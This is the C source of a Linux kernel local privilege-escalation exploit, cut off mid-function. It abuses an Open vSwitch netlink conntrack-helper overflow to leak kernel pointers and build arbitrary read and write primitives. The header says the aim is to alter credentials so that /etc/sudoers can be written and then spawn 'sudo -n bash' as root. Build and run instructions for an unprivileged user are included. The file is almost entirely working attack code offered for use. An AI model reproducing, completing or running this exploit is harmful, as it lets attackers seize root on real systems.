/*
 * a.c -- C port of the ovswrap OVS netlink LPE PoC (a.py).
 *
 * Flow (same as a.py):
 *   1. refuse root / privileged launch; require no preexisting passwordless sudo
 *   2. fork a host "sudoers writer" child that can write /etc/sudoers once the
 *      exploit turns its kernel cred fsuid/fsgid (or caps) into root's
 *   3. fork a child that enters a private user+network namespace, drives the
 *      OVS conntrack-helper overflow to build kernel read/write primitives,
 *      converts the writer's credentials, then triggers the sudoers write
 *   4. parent waits for the child, then spawns "sudo -n bash"
 *
 * Differences from a.py:
 *   - no interactive Y/N prompt for uncovered kernels; it silently attempts
 *     dynamic derivation (System.map/kallsyms + pahole/BTF) and prints info.
 *   - static-binary friendly: no external python; only libc + pahole(optional,
 *     only needed for dynamic derivation on uncovered kernels).
 *
 * Build on Linux:
 *     gcc -static -O2 -Wall -Wextra -o a a.c
 *   (records.inc must be in the same directory; needs static glibc.
 *    If -static fails install glibc-static, or drop -static.)
 *
 * Run as an ordinary, unprivileged, non-sudo user:
 *     ./a
 */

#define _GNU_SOURCE
#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <pwd.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
#include <net/if.h>
#include <linux/genetlink.h>
#include <linux/netlink.h>

#include "records.inc"

/* ---------------------------------------------------------------- netlink */
#define NLMSG_HDR_LEN 16
#define GENL_HDR_LEN 4

#ifndef NLM_F_REQUEST
#define NLM_F_REQUEST 1
#endif
#ifndef NLM_F_ACK
#define NLM_F_ACK 4
#endif
#ifndef NLM_F_CREATE
#define NLM_F_CREATE 0x400
#endif

#ifndef NETLINK_GENERIC
#define NETLINK_GENERIC 16
#endif
#ifndef GENL_ID_CTRL
#define GENL_ID_CTRL 0x10
#endif
#ifndef NLMSG_ERROR
#define NLMSG_ERROR 2
#endif

#ifndef CTRL_CMD_GETFAMILY
#define CTRL_CMD_GETFAMILY 3
#endif
#ifndef CTRL_ATTR_FAMILY_ID
#define CTRL_ATTR_FAMILY_ID 1
#endif
#ifndef CTRL_ATTR_FAMILY_NAME
#define CTRL_ATTR_FAMILY_NAME 2
#endif

#define OVS_DATAPATH_VERSION 2
#define OVS_FLOW_VERSION 1

#define OVS_DP_CMD_NEW 1
#define OVS_DP_ATTR_NAME 1
#define OVS_DP_ATTR_UPCALL_PID 2
#define OVS_DP_ATTR_USER_FEATURES 5

#define OVS_FLOW_CMD_NEW 1
#define OVS_FLOW_CMD_DEL 2
#define OVS_FLOW_CMD_GET 3
#define OVS_FLOW_ATTR_KEY 1
#define OVS_FLOW_ATTR_ACTIONS 2

#define OVS_KEY_ATTR_IN_PORT 3
#define OVS_KEY_ATTR_ETHERNET 4
#define OVS_KEY_ATTR_ETHERTYPE 6
#define OVS_KEY_ATTR_IPV4 7
#define OVS_KEY_ATTR_TCP 9
#define OVS_KEY_ATTR_TUNNEL 16
#define OVS_KEY_ATTR_TCP_FLAGS 18

#define OVS_ACTION_ATTR_OUTPUT 1
#define OVS_ACTION_ATTR_SET 3
#define OVS_ACTION_ATTR_POP_VLAN 5
#define OVS_ACTION_ATTR_CT 12
#define OVS_ACTION_ATTR_CLONE 20

#define OVS_CT_ATTR_COMMIT 1
#define OVS_CT_ATTR_LABELS 4
#define OVS_CT_ATTR_HELPER 5
#define OVS_CT_ATTR_TIMEOUT 9

#define OVS_TUNNEL_KEY_ATTR_IPV4_SRC 1
#define OVS_TUNNEL_KEY_ATTR_IPV4_DST 2
#define OVS_TUNNEL_KEY_ATTR_TOS 3
#define OVS_TUNNEL_KEY_ATTR_TTL 4
#define OVS_TUNNEL_KEY_ATTR_TP_SRC 9
#define OVS_TUNNEL_KEY_ATTR_TP_DST 10
#define OVS_TUNNEL_KEY_ATTR_IPV4_INFO_BRIDGE 16

#define ETH_P_IP 0x0800
#define IPPROTO_TCP 6

#define CT_ACTION_COUNT 400
#define NLA_HEADER_SIZE 4

#define SUDOERS_FILE "/etc/sudoers"
#define SUDOERS_DROPIN_DIR "/etc/sudoers.d"

#define CARRIER_TIMEOUT 0
#define CARRIER_LABELS_ONLY 1
#define CARRIER_AUTO 2

static int OVS_KEY_ATTR_TUNNEL_INFO = 31;

static int nl_sock = -1;
static uint32_t nl_seq = 1;

static void step(const char *msg)
{
    printf("\n***%s***\n", msg);
    fflush(stdout);
}

/* ----------------------------------------------------------- small buffer */
typedef struct {
    uint8_t *d;
    size_t len;
    size_t cap;
} buf;

static void binit(buf *b, size_t cap)
{
    b->cap = cap ? cap : 4096;
    b->d = malloc(b->cap);
    if (!b->d) {
        fprintf(stderr, "out of memory\n");
        exit(1);
    }
    b->len = 0;
}

static void bfree(buf *b)
{
    free(b->d);
    b->d = NULL;
    b->len = b->cap = 0;
}

static void bneed(buf *b, size_t n)
{
    if (b->len + n > b->cap) {
        while (b->len + n > b->cap)
            b->cap *= 2;
        b->d = realloc(b->d, b->cap);
        if (!b->d) {
            fprintf(stderr, "out of memory\n");
            exit(1);
        }
    }
}

static void braw(buf *b, const void *p, size_t n)
{
    bneed(b, n);
    if (n)
        memcpy(b->d + b->len, p, n);
    b->len += n;
}

static void braw_u32le(buf *b, uint32_t v)
{
    uint8_t x[4] = { (uint8_t)(v & 0xff), (uint8_t)((v >> 8) & 0xff),
                     (uint8_t)((v >> 16) & 0xff), (uint8_t)((v >> 24) & 0xff) };
    braw(b, x, 4);
}

static size_t align4(size_t v) { return (v + 3) & ~(size_t)3; }

/* nla(attr_type, payload) with zero padding to 4-byte boundary */
static void bnla(buf *b, uint16_t type, const void *payload, size_t plen)
{
    size_t total = NLA_HEADER_SIZE + plen;
    if (total > 0xFFFF) {
        fprintf(stderr, "netlink attribute too long: %zu\n", total);
        exit(1);
    }
    size_t aligned = align4(total);
    bneed(b, aligned);
    uint8_t *p = b->d + b->len;
    p[0] = (uint8_t)(total & 0xff);
    p[1] = (uint8_t)((total >> 8) & 0xff);
    p[2] = (uint8_t)(type & 0xff);
    p[3] = (uint8_t)((type >> 8) & 0xff);
    if (plen)
        memcpy(p + 4, payload, plen);
    memset(p + 4 + plen, 0, aligned - total);
    b->len += aligned;
}

/* ------------------------------------------------------------ attr parse */
typedef struct {
    uint16_t type;
    uint16_t len; /* includes 4-byte header */
    const uint8_t *data;
} nattr;

static size_t parse_attrs(const uint8_t *buf_, size_t n, nattr *out, size_t max)
{
    size_t count = 0;
    size_t off = 0;
    while (off + 4 <= n && count < max) {
        uint16_t l = (uint16_t)(buf_[off] | (buf_[off + 1] << 8));
        uint16_t t = (uint16_t)(buf_[off + 2] | (buf_[off + 3] << 8));
        if (l < 4 || (size_t)l > n - off)
            break;
        out[count].type = t;
        out[count].len = l;
        out[count].data = buf_ + off + 4;
        count++;
        off += align4(l);
    }
    return count;
}

/* ------------------------------------------------------- generic netlink */
typedef struct {
    uint8_t *data;
    size_t len;
} nreply;

static nreply *nreplies = NULL;
static size_t nreplies_count = 0;
static size_t nreplies_cap = 0;

static void nreply_reset(void)
{
    for (size_t i = 0; i < nreplies_count; i++)
        free(nreplies[i].data);
    nreplies_count = 0;
}

static void nreply_add(const uint8_t *d, size_t n)
{
    if (nreplies_count == nreplies_cap) {
        nreplies_cap = nreplies_cap ? nreplies_cap * 2 : 16;
        nreplies = realloc(nreplies, nreplies_cap * sizeof(*nreplies));
        if (!nreplies) {
            fprintf(stderr, "out of memory\n");
            exit(1);
        }
    }
    nreplies[nreplies_count].data = malloc(n ? n : 1);
    if (!nreplies[nreplies_count].data) {
        fprintf(stderr, "out of memory\n");
        exit(1);
    }
    if (n)
        memcpy(nreplies[nreplies_count].data, d, n);
    nreplies[nreplies_count].len = n;
    nreplies_count++;
}

/* returns 0 on success with replies in *out and *out_count, or -errno */
static int genl_request(uint16_t nlmsg_type, uint8_t cmd, uint8_t version,
                        const uint8_t *payload, size_t plen, uint16_t flags,
                        bool want_ack, nreply **out, size_t *out_count)
{
    size_t msglen = NLMSG_HDR_LEN + GENL_HDR_LEN + plen;
    uint8_t *msg = calloc(1, msglen);
    if (!msg) {
        fprintf(stderr, "out of memory\n");
        exit(1);
    }
    struct nlmsghdr *h = (struct nlmsghdr *)msg;
    h->nlmsg_len = (uint32_t)msglen;
    h->nlmsg_type = nlmsg_type;
    h->nlmsg_flags = flags;
    h->nlmsg_seq = nl_seq;
    h->nlmsg_pid = 0;
    struct genlmsghdr *g = (struct genlmsghdr *)(msg + NLMSG_HDR_LEN);
    g->cmd = cmd;
    g->version = version;
    g->reserved = 0;
    if (plen)
        memcpy(msg + NLMSG_HDR_LEN + GENL_HDR_LEN, payload, plen);

    ssize_t s = send(nl_sock, msg, msglen, 0);
    free(msg);
    if (s < 0)
        return -errno;

    nreply_reset();

    static uint8_t rbuf[1 << 20];
    for (;;) {
        ssize_t n = recv(nl_sock, rbuf, sizeof(rbuf), 0);
        if (n < 0) {
            int e = errno;
            if (e == EINTR)
                continue;
            return -e;
        }
        size_t off = 0;
        while (off + NLMSG_HDR_LEN <= (size_t)n) {
            struct nlmsghdr *rh = (struct nlmsghdr *)(rbuf + off);
            size_t rlen = rh->nlmsg_len;
            if (rh->nlmsg_seq != nl_seq) {
                off += NLMSG_ALIGN(rlen);
                continue;
            }
            const uint8_t *body = rbuf + off + NLMSG_HDR_LEN;
            size_t blen = (rlen >= NLMSG_HDR_LEN) ? rlen - NLMSG_HDR_LEN : 0;
            if (rh->nlmsg_type == NLMSG_ERROR) {
                int32_t error = 0;
                if (blen >= 4)
                    memcpy(&error, body, 4);
                if (error == 0) {
                    nl_seq++;
                    *out = nreplies;
                    *out_count = nreplies_count;
                    return 0;
                }
                nl_seq++;
                *out = NULL;
                *out_count = 0;
                return error; /* nlmsgerr.error is negative errno */
            }
            nreply_add(body, blen);
            off += NLMSG_ALIGN(rlen);
        }
        if (nreplies_count && !want_ack) {
            nl_seq++;
            *out = nreplies;
            *out_count = nreplies_count;
            return 0;
        }
    }
}

static void genl_open(void)
{
    nl_sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (nl_sock < 0) {
        fprintf(stderr, "socket(AF_NETLINK, NETLINK_GENERIC) failed: %s\n",
                strerror(errno));
        exit(1);
    }
    struct sockaddr_nl sa;
    memset(&sa, 0, sizeof(sa));
    sa.nl_family = AF_NETLINK;
    sa.nl_pid = 0;
    if (bind(nl_sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        fprintf(stderr, "netlink bind failed: %s\n", strerror(errno));
        exit(1);
    }
    struct timeval tv = { 30, 0 };
    setsockopt(nl_sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    nl_seq = 1;
}

static int genl_get_family(const char *name)
{
    size_t nl = strlen(name);
    uint8_t *nbuf = malloc(nl + 1);
    if (!nbuf) {
        fprintf(stderr, "out of memory\n");
        exit(1);
    }
    memcpy(nbuf, name, nl);
    nbuf[nl] = 0;
    buf b;
    binit(&b, 64);
    bnla(&b, CTRL_ATTR_FAMILY_NAME, nbuf, nl + 1);
    free(nbuf);

    nreply *reps;
    size_t cnt;
    int rc = genl_request(GENL_ID_CTRL, CTRL_CMD_GETFAMILY, 2, b.d, b.len,
                          NLM_F_REQUEST, false, &reps, &cnt);
    bfree(&b);
    if (rc < 0) {
        fprintf(stderr, "get_family(%s) failed: errno=%d %s\n", name, -rc,
                strerror(-rc));
        if (-rc == ENOENT)
            fprintf(stderr, "hint: the openvswitch kernel module is likely "
                            "not loaded. As host root: modprobe openvswitch\n");
        exit(1);
    }
    for (size_t i = 0; i < cnt; i++) {
        if (reps[i].len < 4 + 4)
            continue;
        nattr attrs[16];
        size_t na = parse_attrs(reps[i].data + 4, reps[i].len - 4, attrs, 16);
        for (size_t j = 0; j < na; j++) {
            if (attrs[j].type == CTRL_ATTR_FAMILY_ID && attrs[j].len - 4 >= 2) {
                uint16_t fid = (uint16_t)(attrs[j].data[0] |
                                          (attrs[j].data[1] << 8));
                return fid;
            }
        }
    }
    fprintf(stderr, "family %s id not found\n", name);
    exit(1);
}

/* -------------------------------------------------------------- OVS msgs */
static void ovs_create_datapath(int family, const char *name)
{
    buf b;
    binit(&b, 128);
    braw_u32le(&b, 0);
    uint8_t zero[4] = { 0, 0, 0, 0 };
    bnla(&b, OVS_DP_ATTR_NAME, name, strlen(name) + 1);
    bnla(&b, OVS_DP_ATTR_UPCALL_PID, zero, 4);
    bnla(&b, OVS_DP_ATTR_USER_FEATURES, zero, 4);
    nreply *reps;
    size_t cnt;
    int rc = genl_request(family, OVS_DP_CMD_NEW, OVS_DATAPATH_VERSION, b.d,
                          b.len, NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE,
                          true, &reps, &cnt);
    bfree(&b);
    if (rc < 0) {
        fprintf(stderr, "create_datapath(%s) failed: errno=%d %s\n", name, -rc,
                strerror(-rc));
        exit(1);
    }
}

static uint8_t *flow_key(uint32_t seq, size_t *out_len)
{
    buf b;
    binit(&b, 128);
    uint32_t src = 0x0A000000u | ((seq & 0xFFFF) + 1);
    uint32_t dst = 0x0A0000FEu;
    uint8_t eth[12] = { 0x02, 0, 0, 0, 0, 1, 0x02, 0, 0, 0, 0, 2 };
    uint8_t etype[2] = { 0x08, 0x00 };
    uint8_t ipv4[12];
    ipv4[0] = (uint8_t)(src >> 24); ipv4[1] = (uint8_t)(src >> 16);
    ipv4[2] = (uint8_t)(src >> 8);  ipv4[3] = (uint8_t)src;
    ipv4[4] = (uint8_t)(dst >> 24); ipv4[5] = (uint8_t)(dst >> 16);
    ipv4[6] = (uint8_t)(dst >> 8);  ipv4[7] = (uint8_t)dst;
    ipv4[8] = IPPROTO_TCP;
    ipv4[9] = 0;
    ipv4[10] = 64;
    ipv4[11] = 0;
    uint16_t sport = (uint16_t)(10000 + (seq % 50000));
    uint8_t tcp[4] = { (uint8_t)(sport >> 8), (uint8_t)(sport & 0xff),
                       (uint8_t)(443 >> 8), (uint8_t)(443 & 0xff) };
    uint8_t flags[2] = { 0, 0 };
    uint8_t inport[4] = { 0, 0, 0, 0 };

    bnla(&b, OVS_KEY_ATTR_IN_PORT, inport, 4);
    bnla(&b, OVS_KEY_ATTR_ETHERNET, eth, 12);
    bnla(&b, OVS_KEY_ATTR_ETHERTYPE, etype, 2);
    bnla(&b, OVS_KEY_ATTR_IPV4, ipv4, 12);
    bnla(&b, OVS_KEY_ATTR_TCP, tcp, 4);
    bnla(&b, OVS_KEY_ATTR_TCP_FLAGS, flags, 2);
    *out_len = b.len;
    return b.d;
}

static void ct_action(buf *out, const uint8_t *payload, size_t plen)
{
    buf inner;
    binit(&inner, plen + 16);
    bnla(&inner, OVS_CT_ATTR_COMMIT, NULL, 0);
    if (plen)
        braw(&inner, payload, plen);
    bnla(out, OVS_ACTION_ATTR_CT, inner.d, inner.len);
    bfree(&inner);
}

static void ct_helper_payload(buf *out)
{
    bnla(out, OVS_CT_ATTR_HELPER, "ftp\0", 4);
}

/* clone(ct_action(first) + ct_action(rest) * (count-1)) */
static uint8_t *clone_build(const uint8_t *first, size_t first_len,
                            const uint8_t *rest, size_t rest_len, size_t count,
                            size_t *out_len)
{
    buf outer;
    binit(&outer, count * 96);
    buf a;
    binit(&a, 128);
    ct_action(&a, first, first_len);
    braw(&outer, a.d, a.len);
    for (size_t i = 1; i < count; i++) {
        bfree(&a);
        binit(&a, 128);
        ct_action(&a, rest, rest_len);
        braw(&outer, a.d, a.len);
    }
    bfree(&a);
    buf final;
    binit(&final, outer.len + 16);
    bnla(&final, OVS_ACTION_ATTR_CLONE, outer.d, outer.len);
    bfree(&outer);
    *out_len = final.len;
    return final.d;
}

static uint8_t *clone_with_helper_leak(size_t *out_len)
{
    uint8_t fake[4] = { 0x00, 0x02, 0x01, 0x00 }; /* nla(512, OUTPUT) LE */
    uint8_t labels[32] = { 0 };
    memcpy(labels + 20, fake, 4);

    buf payload;
    binit(&payload, 128);
    bnla(&payload, OVS_CT_ATTR_LABELS, labels, 32);
    ct_helper_payload(&payload);

    buf rest;
    binit(&rest, 16);
    ct_helper_payload(&rest);

    uint8_t *r = clone_build(payload.d, payload.len, rest.d, rest.len,
                             CT_ACTION_COUNT, out_len);
    bfree(&payload);
    bfree(&rest);
    return r;
}

static uint8_t *clone_with_fake_set_timeout(uint64_t tun_dst, size_t *out_len)
{
    uint8_t labels[32] = { 0 };
    labels[20] = 0xFF; labels[21] = 0xFF;
    labels[22] = (uint8_t)OVS_ACTION_ATTR_SET; labels[23] = 0;
    labels[24] = 12; labels[25] = 0;
    labels[26] = (uint8_t)OVS_KEY_ATTR_TUNNEL_INFO; labels[27] = 0;
    labels[28] = (uint8_t)(tun_dst & 0xff);
    labels[29] = (uint8_t)((tun_dst >> 8) & 0xff);
    labels[30] = (uint8_t)((tun_dst >> 16) & 0xff);
    labels[31] = (uint8_t)((tun_dst >> 24) & 0xff);

    uint8_t timeout[32] = { 0 };
    timeout[0] = (uint8_t)((tun_dst >> 32) & 0xff);
    timeout[1] = (uint8_t)((tun_dst >> 40) & 0xff);
    timeout[2] = (uint8_t)((tun_dst >> 48) & 0xff);
    timeout[3] = (uint8_t)((tun_dst >> 56) & 0xff);

    buf payload;
    binit(&payload, 128);
    bnla(&payload, OVS_CT_ATTR_LABELS, labels, 32);
    bnla(&payload, OVS_CT_ATTR_TIMEOUT, timeout, 32);

    uint8_t *r = clone_build(payload.d, payload.len, NULL, 0, CT_ACTION_COUNT,
                             out_len);
    bfree(&payload);
    return r;
}

static void labels_only_wrap_plan(int ct_action_len, int labels_offset,
                                  int *out_total, int *out_pad)
{
    if (ct_action_len < 8 || ct_action_len % 4) {
        fprintf(stderr, "unexpected OVS CT action length %d\n", ct_action_len);
        exit(1);
    }
    int fake_offset = 16;
    int target_wrap = 8 + labels_offset + fake_offset;
    if (target_wrap >= 0x10000 || target_wrap % 4) {
        fprintf(stderr,
                "cannot target labels-only fake SET wrap offset 0x%x\n",
                target_wrap);
        exit(1);
    }
    int best_score = -1, best_total = 0, best_pad = 0;
    for (int total = 360; total <= 420; total++) {
        int base_wrap = (4 + total * ct_action_len) & 0xFFFF;
        int diff = (target_wrap - base_wrap) & 0xFFFF;
        int pad_count = diff / 4;
        int true_len = 4 + total * ct_action_len + pad_count * 4;
        if (true_len <= 0xFFFF || pad_count > 256)
            continue;
        int score = pad_count + abs(total - 400);
        if (best_score < 0 || score < best_score) {
            best_score = score;
            best_total = total;
            best_pad = pad_count;
        }
    }
    if (best_score < 0) {
        fprintf(stderr, "could not build labels-only fake SET wrap plan for "
                        "ct_action_len=%d labels_offset=%d\n",
                ct_action_len, labels_offset);
        exit(1);
    }
    *out_total = best_total;
    *out_pad = best_pad;
}

static uint8_t *clone_with_fake_set_tunnel_labels_only(uint64_t tun_dst,
                                                       int ct_action_len,
                                                       int labels_offset,
                                                       size_t *out_len)
{
    int total, pad;
    labels_only_wrap_plan(ct_action_len, labels_offset, &total, &pad);

    uint8_t labels[32] = { 0 };
    int fake_offset = 16;
    labels[fake_offset] = 0xFF; labels[fake_offset + 1] = 0xFF;
    labels[fake_offset + 2] = (uint8_t)OVS_ACTION_ATTR_SET;
    labels[fake_offset + 3] = 0;
    labels[fake_offset + 4] = 12; labels[fake_offset + 5] = 0;
    labels[fake_offset + 6] = (uint8_t)OVS_KEY_ATTR_TUNNEL_INFO;
    labels[fake_offset + 7] = 0;
    labels[fake_offset + 8] = (uint8_t)(tun_dst & 0xff);
    labels[fake_offset + 9] = (uint8_t)((tun_dst >> 8) & 0xff);
    labels[fake_offset + 10] = (uint8_t)((tun_dst >> 16) & 0xff);
    labels[fake_offset + 11] = (uint8_t)((tun_dst >> 24) & 0xff);
    labels[fake_offset + 12] = (uint8_t)((tun_dst >> 32) & 0xff);
    labels[fake_offset + 13] = (uint8_t)((tun_dst >> 40) & 0xff);
    labels[fake_offset + 14] = (uint8_t)((tun_dst >> 48) & 0xff);
    labels[fake_offset + 15] = (uint8_t)((tun_dst >> 56) & 0xff);

    buf payload;
    binit(&payload, 64);
    bnla(&payload, OVS_CT_ATTR_LABELS, labels, 32);

    buf outer;
    binit(&outer, total * 96);
    buf a;
    binit(&a, 128);
    ct_action(&a, payload.d, payload.len);
    braw(&outer, a.d, a.len);
    for (int i = 1; i < total; i++) {
        bfree(&a);
        binit(&a, 128);
        ct_action(&a, NULL, 0);
        braw(&outer, a.d, a.len);
    }
    bfree(&a);
    for (int i = 0; i < pad; i++)
        bnla(&outer, OVS_ACTION_ATTR_POP_VLAN, NULL, 0);

    buf final;
    binit(&final, outer.len + 16);
    bnla(&final, OVS_ACTION_ATTR_CLONE, outer.d, outer.len);
    bfree(&outer);
    bfree(&payload);
    *out_len = final.len;
    return final.d;
}

struct offsets {
    int64_t nf_conntrack_helper_me;
    int64_t module_kobj_ktype;
    int64_t vmlinux_module_ktype;
    int64_t vmlinux_init_pid_ns;
    int64_t task_pid;
    int64_t task_cred;
    int64_t task_pid_links;
    int64_t cred_fsuid;
    int64_t cred_fsgid;
    int64_t cred_cap_permitted;
    int64_t cred_cap_effective;
    int64_t pid_namespace_idr;
    int64_t idr_idr_rt;
    int64_t idr_base;
    int64_t xarray_xa_head;
    int64_t xa_node_shift;
    int64_t xa_node_slots;
    int64_t pid_tasks;
    int64_t hlist_head_first;
    int64_t dst_entry_ref;
    const char *dst_entry_ref_kind;
    int64_t metadata_dst_tun_info;
    int64_t ip_tunnel_key_ipv4_src;
    int64_t ip_tunnel_key_ipv4_dst;
    int64_t ip_tunnel_key_tos;
    int64_t ip_tunnel_key_ttl;
    int64_t ip_tunnel_key_tp_src;
    int64_t ip_tunnel_key_tp_dst;
    int64_t ovs_ct_labels;
    int64_t ovs_ct_action_len;
};

struct kernel_build_record {
    const char *release;
    const char *version;
    const char *machine;
    struct offsets offsets;
    const char *read_carrier;
    const char *write_carrier;
    const char **read_lanes;
    int read_lanes_count;
    int ovs_key_attr_tunnel_info;
};

static uint8_t *clone_with_fake_set_carrier(int carrier, uint64_t tun_dst,
                                            const struct offsets *o,
                                            size_t *out_len)
{
    if (carrier == CARRIER_TIMEOUT)
        return clone_with_fake_set_timeout(tun_dst, out_len);
    if (carrier == CARRIER_LABELS_ONLY)
        return clone_with_fake_set_tunnel_labels_only(
            tun_dst, (int)o->ovs_ct_action_len, (int)o->ovs_ct_labels,
            out_len);
    fprintf(stderr, "unknown fake SET carrier %d\n", carrier);
    exit(1);
}

static int ovs_create_flow(int family, int dp_ifindex, const uint8_t *key,
                           size_t klen, const uint8_t *actions, size_t alen)
{
    buf b;
    binit(&b, klen + alen + 32);
    braw_u32le(&b, (uint32_t)dp_ifindex);
    bnla(&b, OVS_FLOW_ATTR_KEY, key, klen);
    bnla(&b, OVS_FLOW_ATTR_ACTIONS, actions, alen);
    nreply *reps;
    size_t cnt;
    int rc = genl_request(family, OVS_FLOW_CMD_NEW, OVS_FLOW_VERSION, b.d,
                          b.len, NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE,
                          true, &reps, &cnt);
    bfree(&b);
    return rc;
}

static int ovs_delete_flow(int family, int dp_ifindex, const uint8_t *key,
                           size_t klen)
{
    buf b;
    binit(&b, klen + 16);
    braw_u32le(&b, (uint32_t)dp_ifindex);
    bnla(&b, OVS_FLOW_ATTR_KEY, key, klen);
    nreply *reps;
    size_t cnt;
    int rc = genl_request(family, OVS_FLOW_CMD_DEL, OVS_FLOW_VERSION, b.d,
                          b.len, NLM_F_REQUEST | NLM_F_ACK, true, &reps,
                          &cnt);
    bfree(&b);
    return rc;
}

#define E_NO_ACTIONS 1000 /* sentinel: response had no ACTIONS attr */

static int ovs_get_flow_actions(int family, int dp_ifindex, const uint8_t *key,
                                size_t klen, uint8_t **out, size_t *outlen)
{
    buf b;
    binit(&b, klen + 16);
    braw_u32le(&b, (uint32_t)dp_ifindex);
    bnla(&b, OVS_FLOW_ATTR_KEY, key, klen);
    nreply *reps;
    size_t cnt;
    int rc = genl_request(family, OVS_FLOW_CMD_GET, OVS_FLOW_VERSION, b.d,
                          b.len, NLM_F_REQUEST | NLM_F_ACK, true, &reps,
                          &cnt);
    bfree(&b);
    if (rc < 0)
        return rc;
    if (cnt == 0 || reps[0].len < 8)
        return -E_NO_ACTIONS;
    nattr attrs[64];
    size_t na = parse_attrs(reps[0].data + 8, reps[0].len - 8, attrs, 64);
    for (size_t i = 0; i < na; i++) {
        if (attrs[i].type == OVS_FLOW_ATTR_ACTIONS) {
            size_t alen = (size_t)attrs[i].len - 4;
            uint8_t *a = malloc(alen ? alen : 1);
            if (!a) {
                fprintf(stderr, "out of memory\n");
                exit(1);
            }
            if (alen)
                memcpy(a, attrs[i].data, alen);
            *out = a;
            *outlen = alen;
            return 0;
        }
    }
    return -E_NO_ACTIONS;
}

static bool carrier_error(int rc)
{
    if (rc == -EINVAL)
        return true;
    if (rc == -E_NO_ACTIONS)
        return true;
    return false;
}

/* ------------------------------------------------------------- read lanes */
typedef struct {
    char name[24];
    int64_t field_offset;
    uint16_t attr_type;
    int payload_index;
    bool optional_zero;
} lane_t;

typedef struct {
    int mode;
    bool timeout_disabled;
    const char *label;
} carriers_t;

typedef struct {
    int flow_family;
    int dp_ifindex;
    const struct offsets *offsets;
    carriers_t carriers;
    lane_t lanes[14];
    int lane_count;
    uint32_t seq;
} reader_t;

typedef struct {
    int flow_family;
    int dp_ifindex;
    const struct offsets *offsets;
    carriers_t carriers;
    uint32_t seq;
} writer_t;

static int carrier_names(const carriers_t *c, int *out)
{
    if (c->mode != CARRIER_AUTO) {
        out[0] = c->mode;
        return 1;
    }
    if (c->timeout_disabled) {
        out[0] = CARRIER_LABELS_ONLY;
        return 1;
    }
    out[0] = CARRIER_TIMEOUT;
    out[1] = CARRIER_LABELS_ONLY;
    return 2;
}

static bool retry_after(carriers_t *c, int carrier, bool has_next)
{
    if (c->mode != CARRIER_AUTO || carrier != CARRIER_TIMEOUT || !has_next)
        return false;
    printf("fake SET timeout carrier failed for %s; using labels-only "
           "carrier\n", c->label);
    fflush(stdout);
    c->timeout_disabled = true;
    return true;
}

static uint64_t find_helper_pointer(const uint8_t *actions, size_t alen)
{
    nattr tops[64];
    size_t n = parse_attrs(actions, alen, tops, 64);
    for (size_t i = 0; i < n; i++) {
        if (tops[i].type != OVS_ACTION_ATTR_OUTPUT || tops[i].len != 512)
            continue;
        uint64_t hits[512];
        size_t nh = 0;
        const uint8_t *p = tops[i].data;
        size_t plen = (size_t)tops[i].len - 4;
        for (size_t off = 0; off + 8 <= plen && nh < 512; off++) {
            uint64_t v = 0;
            for (int b = 0; b < 8; b++)
                v |= (uint64_t)p[off + b] << (8 * b);
            if (v >= 0xFFFF800000000000ULL)
                hits[nh++] = v;
        }
        for (size_t k = 0; k < nh; k++) {
            uint64_t v = hits[k];
            if (v >= 0xFFFFFFFFC0000000ULL && v <= 0xFFFFFFFFDFFFFFFFULL &&
                (v & 7) == 0)
                return v;
        }
        if (nh)
            return hits[0];
    }
    fprintf(stderr, "no helper pointer found in fake OUTPUT leak\n");
    exit(1);
}

/* returns byte value >=0, or -1 (carrier rejected / try next lane), or -2 (fatal) */
static int read_u8_with_lane(reader_t *r, uint64_t address, const lane_t *lane)
{
    uint64_t key_start = address - (uint64_t)lane->field_offset;
    uint64_t tun_dst = key_start - (uint64_t)r->offsets->metadata_dst_tun_info;

    int carriers[2];
    int nc = carrier_names(&r->carriers, carriers);
    uint8_t *dumped = NULL;
    size_t dumped_len = 0;
    bool have_dumped = false;

    for (int i = 0; i < nc; i++) {
        int carrier = carriers[i];
        r->seq++;
        size_t klen;
        uint8_t *key = flow_key(r->seq, &klen);
        size_t alen;
        uint8_t *actions =
            clone_with_fake_set_carrier(carrier, tun_dst, r->offsets, &alen);

        int rc = ovs_create_flow(r->flow_family, r->dp_ifindex, key, klen,
                                 actions, alen);
        if (rc < 0) {
            free(key);
            free(actions);
            if (carrier_error(rc)) {
                if (retry_after(&r->carriers, carrier, i + 1 < nc))
                    continue;
                return -1;
            }
            return -2;
        }
        rc = ovs_get_flow_actions(r->flow_family, r->dp_ifindex, key, klen,
                                  &dumped, &dumped_len);
        free(key);
        free(actions);
        if (rc < 0) {
            if (carrier_error(rc)) {
                if (retry_after(&r->carriers, carrier, i + 1 < nc))
                    continue;
                return -1;
            }
            return -2;
        }
        have_dumped = true;
        break;
    }
    if (!have_dumped)
        return -1;

    int result = -1;
    nattr tops[64];
    size_t ntop = parse_attrs(dumped, dumped_len, tops, 64);
    for (size_t ti = 0; ti < ntop; ti++) {
        if (tops[ti].type != OVS_ACTION_ATTR_SET)
            continue;
        nattr tunnels[16];
        size_t ntn = parse_attrs(tops[ti].data, (size_t)tops[ti].len - 4,
                                 tunnels, 16);
        for (size_t ti2 = 0; ti2 < ntn; ti2++) {
            if (tunnels[ti2].type != OVS_KEY_ATTR_TUNNEL)
                continue;
            bool saw_tunnel = false;
            nattr tattrs[16];
            size_t nta = parse_attrs(tunnels[ti2].data,
                                     (size_t)tunnels[ti2].len - 4, tattrs, 16);
            for (size_t j = 0; j < nta; j++) {
                if (tattrs[j].type == OVS_TUNNEL_KEY_ATTR_IPV4_INFO_BRIDGE) {
                    result = -1;
                    goto done;
                }
                saw_tunnel = true;
                if (tattrs[j].type == lane->attr_type) {
                    if ((size_t)tattrs[j].len - 4 <=
                        (size_t)lane->payload_index) {
                        fprintf(stderr,
                                "unexpected %s payload length %u\n",
                                lane->name, (unsigned)tattrs[j].len);
                        exit(1);
                    }
                    result = tattrs[j].data[lane->payload_index];
                    goto done;
                }
            }
            if (saw_tunnel && lane->optional_zero) {
                result = 0;
                goto done;
            }
